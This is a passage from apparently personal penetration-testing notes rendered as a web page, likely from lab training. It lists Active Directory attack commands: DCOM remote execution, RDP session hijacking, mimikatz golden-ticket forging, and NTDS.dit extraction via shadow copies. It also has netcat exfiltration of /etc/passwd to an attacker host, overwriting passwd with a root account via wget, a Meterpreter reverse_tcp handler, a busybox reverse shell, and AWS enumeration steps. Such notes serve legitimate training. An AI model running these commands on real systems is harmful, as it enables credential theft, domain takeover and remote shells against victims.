</span><span id="__span-100-14"><a id="__codelineno-100-14" name="__codelineno-100-14" href="#__codelineno-100-14"></a>impacket-smbclient<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>corp.com/dave@web04.corp.com<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.x.x
</span><span id="__span-100-15"><a id="__codelineno-100-15" name="__codelineno-100-15" href="#__codelineno-100-15"></a>
</span><span id="__span-100-16"><a id="__codelineno-100-16" name="__codelineno-100-16" href="#__codelineno-100-16"></a><span class="c1"># 🚶 thru DCOM, read more about it [[Active Directory Pentesting#DCOM]]</span>
</span><span id="__span-100-17"><a id="__codelineno-100-17" name="__codelineno-100-17" href="#__codelineno-100-17"></a><span class="nv">$dcom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Activator<span class="o">]</span>::CreateInstance<span class="o">([</span>type<span class="o">]</span>::GetTypeFromProgID<span class="o">(</span><span class="s2">&quot;MMC20.Application.1&quot;</span>,<span class="s2">&quot;192.168.50.73&quot;</span><span class="o">))</span>
</span><span id="__span-100-18"><a id="__codelineno-100-18" name="__codelineno-100-18" href="#__codelineno-100-18"></a><span class="nv">$dcom</span>.Document.ActiveView.ExecuteShellCommand<span class="o">(</span><span class="s2">&quot;cmd&quot;</span>,<span class="nv">$null</span>,<span class="s2">&quot;/c calc&quot;</span>,<span class="s2">&quot;7&quot;</span><span class="o">)</span>
</span><span id="__span-100-19"><a id="__codelineno-100-19" name="__codelineno-100-19" href="#__codelineno-100-19"></a>
</span><span id="__span-100-20"><a id="__codelineno-100-20" name="__codelineno-100-20" href="#__codelineno-100-20"></a>
</span><span id="__span-100-21"><a id="__codelineno-100-21" name="__codelineno-100-21" href="#__codelineno-100-21"></a><span class="c1"># ALSO CHECK [[#🚪Initial Access]]  and  [[Active Directory Pentesting#Different Access Types]]</span>
</span></code></pre></div>
<h4 id="rdp-hijacking">RDP Hijacking</h4>
<p>just written for knowledge
we can dump hashes of user as an administrator directly from the memory
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a><span class="c"># Administrator user needed to be logged in thru&#39; RDP</span>
</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a><span class="n">query</span> <span class="n">user</span>
</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#__codelineno-101-3"></a><span class="c"># if any user has the state: Disc</span>
</span><span id="__span-101-4"><a id="__codelineno-101-4" name="__codelineno-101-4" href="#__codelineno-101-4"></a><span class="n">tscon</span> <span class="n">3</span> <span class="p">/</span><span class="n">dest</span><span class="p">:</span><span class="n">rdp-tcp</span><span class="c">#6 # dest should be our session name</span>
</span></code></pre></div></p>
<h3 id="persistence">Persistence</h3>
<h4 id="golden-ticket">Golden Ticket</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a><span class="c"># 🎫Golden Ticket  -  Needs to compromise domain controller to extract krbtgt hash</span>
</span><span id="__span-102-2"><a id="__codelineno-102-2" name="__codelineno-102-2" href="#__codelineno-102-2"></a><span class="c"># we can forge a TGT using the **krbtgt** hash to gain full control over domain resources.</span>
</span><span id="__span-102-3"><a id="__codelineno-102-3" name="__codelineno-102-3" href="#__codelineno-102-3"></a><span class="n">mimikatz</span><span class="p">&gt;</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span><span id="__span-102-4"><a id="__codelineno-102-4" name="__codelineno-102-4" href="#__codelineno-102-4"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">patch</span>
</span><span id="__span-102-5"><a id="__codelineno-102-5" name="__codelineno-102-5" href="#__codelineno-102-5"></a><span class="c"># after getting ntlm hash of krbtgt, we can forge tgt in any machine</span>
</span><span id="__span-102-6"><a id="__codelineno-102-6" name="__codelineno-102-6" href="#__codelineno-102-6"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">purge</span>  <span class="c"># delete any kerberos tickets</span>
</span><span id="__span-102-7"><a id="__codelineno-102-7" name="__codelineno-102-7" href="#__codelineno-102-7"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">jen</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1987370270</span><span class="p">-</span><span class="n">658905905</span><span class="p">-</span><span class="n">1781884369</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="n">1693c6cefafffc7af11ef34d1c788f47</span> <span class="p">/</span><span class="n">ptt</span>
</span><span id="__span-102-8"><a id="__codelineno-102-8" name="__codelineno-102-8" href="#__codelineno-102-8"></a><span class="n">misc</span><span class="p">::</span><span class="n">cmd</span>
</span><span id="__span-102-9"><a id="__codelineno-102-9" name="__codelineno-102-9" href="#__codelineno-102-9"></a><span class="c"># this attack is like overpass the hash attack because getting ticket through hash.</span>
</span><span id="__span-102-10"><a id="__codelineno-102-10" name="__codelineno-102-10" href="#__codelineno-102-10"></a>
</span><span id="__span-102-11"><a id="__codelineno-102-11" name="__codelineno-102-11" href="#__codelineno-102-11"></a><span class="c"># in kali, ticketer used to created silver/golder ticket</span>
</span><span id="__span-102-12"><a id="__codelineno-102-12" name="__codelineno-102-12" href="#__codelineno-102-12"></a><span class="n">impacket-ticketer</span> <span class="n">-nthash</span> <span class="p">&lt;</span><span class="n">KRBTGT_NTLM</span><span class="p">&gt;</span> <span class="n">-domain-sid</span> <span class="p">&lt;</span><span class="n">SID</span><span class="p">&gt;</span> <span class="n">-domain</span> <span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="n">-dc-ip</span> <span class="n">ip</span> <span class="n">Administrator</span> <span class="c"># target user to get privs of</span>
</span><span id="__span-102-13"><a id="__codelineno-102-13" name="__codelineno-102-13" href="#__codelineno-102-13"></a><span class="c"># to get domain SID from kali</span>
</span><span id="__span-102-14"><a id="__codelineno-102-14" name="__codelineno-102-14" href="#__codelineno-102-14"></a><span class="n">rpcclient</span> <span class="n">-U</span> <span class="s2">&quot;corp.com/user&quot;</span> <span class="n">dc-ip</span>
</span><span id="__span-102-15"><a id="__codelineno-102-15" name="__codelineno-102-15" href="#__codelineno-102-15"></a><span class="n">rcp</span><span class="p">&gt;</span> <span class="n">lookupdomain</span> <span class="n">corp</span><span class="p">.</span><span class="n">com</span>
</span><span id="__span-102-16"><a id="__codelineno-102-16" name="__codelineno-102-16" href="#__codelineno-102-16"></a>
</span><span id="__span-102-17"><a id="__codelineno-102-17" name="__codelineno-102-17" href="#__codelineno-102-17"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">TICKET</span><span class="p">.</span><span class="n">ccache</span> 
</span><span id="__span-102-18"><a id="__codelineno-102-18" name="__codelineno-102-18" href="#__codelineno-102-18"></a><span class="n">klist</span>
</span><span id="__span-102-19"><a id="__codelineno-102-19" name="__codelineno-102-19" href="#__codelineno-102-19"></a><span class="n">impacket-psexec</span> <span class="n">-k</span> <span class="n">corp</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">Administrator</span><span class="nv">@hostname</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">238</span><span class="p">.</span><span class="n">70</span> <span class="n">-no-pass</span> 
</span></code></pre></div>
<h4 id="shadow-copies">Shadow Copies</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a><span class="c1"># 🎫Shadow Copies, creates the copy of NTDS.dit from DC and take system hive</span>
</span><span id="__span-103-2"><a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a>vshadow.exe<span class="w"> </span>-nw<span class="w"> </span>-p<span class="w">  </span>C:
</span><span id="__span-103-3"><a id="__codelineno-103-3" name="__codelineno-103-3" href="#__codelineno-103-3"></a>copy<span class="w"> </span><span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy2<span class="se">\w</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds.dit<span class="w"> </span>c:<span class="se">\n</span>tds.dit.bak<span class="w">  </span><span class="c1"># The exact path before \Windows\... is determined by the vshadow output — make sure to copy it accurately from the command result.</span>
</span><span id="__span-103-4"><a id="__codelineno-103-4" name="__codelineno-103-4" href="#__codelineno-103-4"></a>reg.exe<span class="w"> </span>save<span class="w"> </span>hklm<span class="se">\s</span>ystem<span class="w"> </span>c:<span class="se">\s</span>ystem.bak
</span><span id="__span-103-5"><a id="__codelineno-103-5" name="__codelineno-103-5" href="#__codelineno-103-5"></a><span class="c1"># on kali, extract the credential using these 2 files</span>
</span><span id="__span-103-6"><a id="__codelineno-103-6" name="__codelineno-103-6" href="#__codelineno-103-6"></a>impacket-secretsdump<span class="w"> </span>-ntds<span class="w"> </span>ntds.dit.bak<span class="w"> </span>-system<span class="w"> </span>system.bak<span class="w"> </span>LOCAL
</span></code></pre></div>
<h4 id="more_2">More</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a><span class="c1"># Adding new user to /etc/passwd file</span>
</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a>nc<span class="w"> </span>-nlvp<span class="w"> </span><span class="m">80</span><span class="w"> </span>&gt;<span class="w"> </span>passwd.bak<span class="w">  </span><span class="c1"># to receive passwd file from victim</span>
</span><span id="__span-104-3"><a id="__codelineno-104-3" name="__codelineno-104-3" href="#__codelineno-104-3"></a>nc<span class="w"> </span>-nv<span class="w"> </span>attacking_IP<span class="w"> </span><span class="m">80</span><span class="w"> </span>&lt;<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="c1"># send</span>
</span><span id="__span-104-4"><a id="__codelineno-104-4" name="__codelineno-104-4" href="#__codelineno-104-4"></a>
</span><span id="__span-104-5"><a id="__codelineno-104-5" name="__codelineno-104-5" href="#__codelineno-104-5"></a>
</span><span id="__span-104-6"><a id="__codelineno-104-6" name="__codelineno-104-6" href="#__codelineno-104-6"></a>mkpasswd<span class="w"> </span>--method<span class="o">=</span>MD5<span class="w"> </span>--stdin<span class="w">    </span>
</span><span id="__span-104-7"><a id="__codelineno-104-7" name="__codelineno-104-7" href="#__codelineno-104-7"></a>Password:<span class="w"> </span>pass
</span><span id="__span-104-8"><a id="__codelineno-104-8" name="__codelineno-104-8" href="#__codelineno-104-8"></a><span class="nv">$1$Ls0oeXvv$ZwE8B7S1figJUIq2y</span>/cIQ1
</span><span id="__span-104-9"><a id="__codelineno-104-9" name="__codelineno-104-9" href="#__codelineno-104-9"></a><span class="c1"># add inside passwd.bak</span>
</span><span id="__span-104-10"><a id="__codelineno-104-10" name="__codelineno-104-10" href="#__codelineno-104-10"></a>test:<span class="nv">$1$Ls0oeXvv$ZwE8B7S1figJUIq2y</span>/cIQ1:0:0:Test,,,:/root
</span><span id="__span-104-11"><a id="__codelineno-104-11" name="__codelineno-104-11" href="#__codelineno-104-11"></a><span class="c1"># on victim</span>
</span><span id="__span-104-12"><a id="__codelineno-104-12" name="__codelineno-104-12" href="#__codelineno-104-12"></a>wget<span class="w"> </span>-O<span class="w"> </span>/etc/passwd<span class="w"> </span>attacking_IP/passwd.bak
</span></code></pre></div>
<h2 id="meterpreter-be-cautious-to-use-only-one-1-machine">Meterpreter (Be Cautious to Use only one 1 Machine)</h2>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>msfconsole<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.175;set LPORT 4444;run;&quot;</span>
</span></code></pre></div>
<h2 id="important-payloads">Important payloads</h2>
<p>https://www.revshells.com/
<div class="language-shell highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a><span class="c1"># Some version of nc doesn&#39;t have the -e feature</span>
</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a>busybox<span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.45.175<span class="w"> </span><span class="m">7755</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash<span class="w">  </span><span class="c1"># mostly work on every place as compared to other places </span>
</span></code></pre></div></p>
<h2 id="aws">☁AWS</h2>
<h3 id="domain-recon">Domain Recon</h3>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a><span class="c1"># Step 1: Identify the authoritative name servers for the domain</span>
</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#__codelineno-107-2"></a>host<span class="w"> </span>-t<span class="w"> </span>ns<span class="w"> </span>offseclab.io
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a><span class="c1"># Step 2: Identify the organization behind the nameserver domain (could reveal AWS or third-party services)</span>
</span><span id="__span-108-2"><a id="__codelineno-108-2" name="__codelineno-108-2" href="#__codelineno-108-2"></a>whois<span class="w"> </span>&lt;ns-domain&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;Registrant Organization&quot;</span>
</span></code></pre></div>
<blockquote>
<p>💡 Note: If the nameserver domain belongs to AWS (e.g., <code>awsdns-xx.org</code>), it typically indicates the use of <strong>Route 53</strong> for DNS management.<br />
⚠️ However, this <strong>does not confirm</strong> that the <strong>infrastructure</strong> (e.g., web servers, APIs) is also hosted on AWS.</p>
</blockquote>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a><span class="c1"># Step 3: Resolve the public IP of the web service (e.g., www.offseclab.io)</span>
</span><span id="__span-109-2"><a id="__codelineno-109-2" name="__codelineno-109-2" href="#__codelineno-109-2"></a>host<span class="w"> </span>www.offseclab.io
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a><span class="c1"># Step 4: Perform reverse DNS lookup to get the hostname of the resolved IP</span>
</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a>host<span class="w"> </span><span class="m">52</span>.70.117.69
</span><span id="__span-110-3"><a id="__codelineno-110-3" name="__codelineno-110-3" href="#__codelineno-110-3"></a><span class="c1"># Expected output:</span>
</span><span id="__span-110-4"><a id="__codelineno-110-4" name="__codelineno-110-4" href="#__codelineno-110-4"></a><span class="c1"># 69.117.70.52.in-addr.arpa domain name pointer ec2-52-70-117-69.compute-1.amazonaws.com.</span>
</span></code></pre></div>
<blockquote>
<p>🔍 The presence of <code>ec2-*.compute-1.amazonaws.com</code> in the PTR record strongly suggests the server is an <strong>EC2 instance</strong> hosted in AWS (specifically in the <strong>us-east-1</strong> region).</p>
</blockquote>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a><span class="c1"># Step 5: Confirm ownership of the IP address using whois</span>
</span><span id="__span-111-2"><a id="__codelineno-111-2" name="__codelineno-111-2" href="#__codelineno-111-2"></a>whois<span class="w"> </span><span class="m">52</span>.70.117.69<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;OrgName&quot;</span>
</span><span id="__span-111-3"><a id="__codelineno-111-3" name="__codelineno-111-3" href="#__codelineno-111-3"></a><span class="c1"># Output: Amazon Technologies Inc.</span>
</span></code></pre></div>
<blockquote>
<p>✅ This confirms that the resource is hosted on AWS infrastructure.</p>
</blockquote>
<h3 id="service-specific">Service Specific</h3>
<h4 id="s3-bucket">S3 bucket</h4>
<p>This discovery of bucket or objects within the bucket required some creativity and assumptions but shows an example of enumerating cloud resources. The process is also easy to automate by writing a script on our own or searching for an already-built tool like <a href="https://www.kali.org/tools/cloudbrute/"><em>cloudbrute</em></a> or <a href="https://www.kali.org/tools/cloud-enum/"><em>cloud-enum</em></a>.
<div class="language-shell highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a><span class="c1"># http://domain/bucket_name</span>
</span><span id="__span-112-2"><a id="__codelineno-112-2" name="__codelineno-112-2" href="#__codelineno-112-2"></a>cloud_enum<span class="w"> </span>-k<span class="w"> </span>bucket_name<span class="w"> </span>--quickscan<span class="w"> </span>--disable-azure<span class="w"> </span>--disable-gcp
</span><span id="__span-112-3"><a id="__codelineno-112-3" name="__codelineno-112-3" href="#__codelineno-112-3"></a>
</span><span id="__span-112-4"><a id="__codelineno-112-4" name="__codelineno-112-4" href="#__codelineno-112-4"></a><span class="c1"># examples</span>
</span><span id="__span-112-5"><a id="__codelineno-112-5" name="__codelineno-112-5" href="#__codelineno-112-5"></a>cloud_enum<span class="w"> </span>-k<span class="w"> </span>offseclab-assets-public<span class="w"> </span>--quickscan<span class="w"> </span>--disable-azure<span class="w"> </span>--disable-gcp
</span><span id="__span-112-6"><a id="__codelineno-112-6" name="__codelineno-112-6" href="#__codelineno-112-6"></a><span class="c1"># Because we are testing a specific naming pattern, we&#39;ll benefit from building a custom key file.</span>
</span><span id="__span-112-7"><a id="__codelineno-112-7" name="__codelineno-112-7" href="#__codelineno-112-7"></a><span class="k">for</span><span class="w"> </span>key<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s2">&quot;public&quot;</span><span class="w"> </span><span class="s2">&quot;private&quot;</span><span class="w"> </span><span class="s2">&quot;dev&quot;</span><span class="w"> </span><span class="s2">&quot;prod&quot;</span><span class="w"> </span><span class="s2">&quot;development&quot;</span><span class="w"> </span><span class="s2">&quot;production&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;offseclab-assets-</span><span class="nv">$key</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>/tmp/keyfile.txt
</span><span id="__span-112-8"><a id="__codelineno-112-8" name="__codelineno-112-8" href="#__codelineno-112-8"></a>cloud_enum<span class="w"> </span>-kf<span class="w"> </span>/tmp/keyfile.txt<span class="w"> </span>-qs<span class="w"> </span>--disable-azure<span class="w"> </span>--disable-gcp
</span></code></pre></div></p>
<h3 id="enumeration-thru-api">Enumeration thru API</h3>
<p>Authenticate first
<div class="language-shell highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>aws<span class="w"> </span>configure<span class="w"> </span>--profile<span class="w"> </span>username<span class="w">  </span><span class="c1"># no need to give the real username, it&#39;s just local profile name</span>
</span><span id="__span-113-2"><a id="__codelineno-113-2" name="__codelineno-113-2" href="#__codelineno-113-2"></a><span class="c1"># prompts ask for ACCESS_KEY_ID, SECRET_ACCESS_KEY, REGION_NAME, OUTPUT_FORMAT</span>
</span><span id="__span-113-3"><a id="__codelineno-113-3" name="__codelineno-113-3" href="#__codelineno-113-3"></a><span class="c1"># to check if authenticated successfully</span>
</span><span id="__span-113-4"><a id="__codelineno-113-4" name="__codelineno-113-4" href="#__codelineno-113-4"></a>aws<span class="w"> </span>--profile<span class="w"> </span>attacker<span class="w"> </span>sts<span class="w"> </span>get-caller-identity<span class="w">  </span><span class="c1"># to get username, account_id, Arn </span>
</span></code></pre></div></p>
<p>Enumerate the below
- Publicly shared <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AMIs.html"><em>Amazon Machine Images</em></a> (AMIs)
- Publicly shared <a href="https://aws.amazon.com/ebs/"><em>Elastic Block Storage</em></a> (EBS) snapshots
- <a href="https://aws.amazon.com/rds/"><em>Relational Databases</em></a> (RDS) snapshots
<div class="language-shell highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a><span class="c1"># if there&#39;s only one profile no need to mention with every command</span>
</span><span id="__span-114-2"><a id="__codelineno-114-2" name="__codelineno-114-2" href="#__codelineno-114-2"></a><span class="c1"># Lists AMIs provided by Amazon</span>
</span><span id="__span-114-3"><a id="__codelineno-114-3" name="__codelineno-114-3" href="#__codelineno-114-3"></a>aws<span class="w"> </span>--profile<span class="w"> </span>username<span class="w"> </span>ec2<span class="w"> </span>describe-images<span class="w"> </span>--owners<span class="w"> </span>amazon<span class="w"> </span>--executable-users<span class="w"> </span>all
</span><span id="__span-114-4"><a id="__codelineno-114-4" name="__codelineno-114-4" href="#__codelineno-114-4"></a><span class="c1"># Lists shared EBS snapshots</span>
</span><span id="__span-114-5"><a id="__codelineno-114-5" name="__codelineno-114-5" href="#__codelineno-114-5"></a>aws<span class="w"> </span>--profile<span class="w"> </span>attacker<span class="w"> </span>ec2<span class="w"> </span>describe-snapshots<span class="w"> </span>--filters<span class="w"> </span><span class="s2">&quot;Name=description,Values=*offseclab*&quot;</span>
</span><span id="__span-114-6"><a id="__codelineno-114-6" name="__codelineno-114-6" href="#__codelineno-114-6"></a><span class="c1"># List s3 bucket objects</span>
</span><span id="__span-114-7"><a id="__codelineno-114-7" name="__codelineno-114-7" href="#__codelineno-114-7"></a>aws<span class="w"> </span>--profile<span class="w"> </span>attacker<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>bucketname
</span></code></pre></div></p>
<h5 id="identify-the-aws-account-id-from-a-public-s3-bucket">Identify the AWS Account ID from a Public S3 Bucket</h5>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a><span class="c1"># use this tool [s3-account-search](https://github.com/WeAreCloudar/s3-account-search)</span>
</span><span id="__span-115-2"><a id="__codelineno-115-2" name="__codelineno-115-2" href="#__codelineno-115-2"></a>s3-account-search<span class="w"> </span>arn:aws:iam::&lt;ACCOUNT_ID&gt;:role/s3_read<span class="w"> </span>s3://my-bucket<span class="w"> </span>
</span><span id="__span-115-3"><a id="__codelineno-115-3" name="__codelineno-115-3" href="#__codelineno-115-3"></a><span class="c1"># identify s3 bucket region by check the value of x-amz-bucket-region header</span>
</span><span id="__span-115-4"><a id="__codelineno-115-4" name="__codelineno-115-4" href="#__codelineno-115-4"></a>curl<span class="w"> </span>-I<span class="w"> </span>https://mega-big-tech.s3.amazonaws.com
</span><span id="__span-115-5"><a id="__codelineno-115-5" name="__codelineno-115-5" href="#__codelineno-115-5"></a>
</span><span id="__span-115-6"><a id="__codelineno-115-6" name="__codelineno-115-6" href="#__codelineno-115-6"></a><span class="c1"># [pwnedLabs.io](https://pwnedlabs.io/labs/identify-the-aws-account-id-from-a-public-s3-bucket)</span>
</span></code></pre></div>
<h5 id="to-filter-search">To filter &amp; search</h5>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>--filters<span class="w"> </span><span class="s2">&quot;Name=filter-name,Values=filter-value1,filter-value2,...&quot;</span>
</span><span id="__span-116-2"><a id="__codelineno-116-2" name="__codelineno-116-2" href="#__codelineno-116-2"></a><span class="c1"># example</span>
</span><span id="__span-116-3"><a id="__codelineno-116-3" name="__codelineno-116-3" href="#__codelineno-116-3"></a>--filters<span class="w"> </span><span class="s2">&quot;Name=description,Values=*Offseclab*&quot;</span>
</span></code></pre></div>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "..", "features": ["content.code.copy", "content.code.select", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "navigation.sections", "navigation.expand", "search.share", "search.suggest"], "search": "../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.56ea9cef.min.js"></script>
      
    
  </body>
</html>